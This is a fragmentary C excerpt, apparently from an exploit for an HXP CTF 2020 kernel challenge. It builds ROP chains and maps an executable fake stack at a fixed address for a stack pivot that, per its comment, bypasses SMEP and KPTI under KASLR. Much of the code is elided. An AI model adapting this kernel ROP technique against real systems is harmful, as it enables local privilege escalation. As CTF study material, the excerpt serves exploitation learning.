...
void build_rop(uint64_t *buf, size_t o)
{
    ...
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = mov_esp_pop2_ret;
}

void build_rop2(uint64_t *buf, size_t o)
{
    buf[o++] = 0x0;
    buf[o++] = 0x0;
    buf[o++] = pop_rdi_ret;
...
/*
 * HXP ctf 2020 kernel rop with SMEP, and KPTI no SMAP and KASLR
 * + stack pivot
 */
...
int main(void)
{
    ...
    uint64_t* fake_stack = mmap((void*)0x5b000000-0x1000, 0x2000, PROT_READ | 
                                PROT_WRITE |PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE
                                |MAP_FIXED, -1, 0);

    fake_stack[0] = 0xc0c0c0;
    if (fake_stack == MAP_FAILED) {
        perror("mmap");
    }

    build_rop(buf, 17);
    build_rop2(fake_stack, 0x1000 / 8);
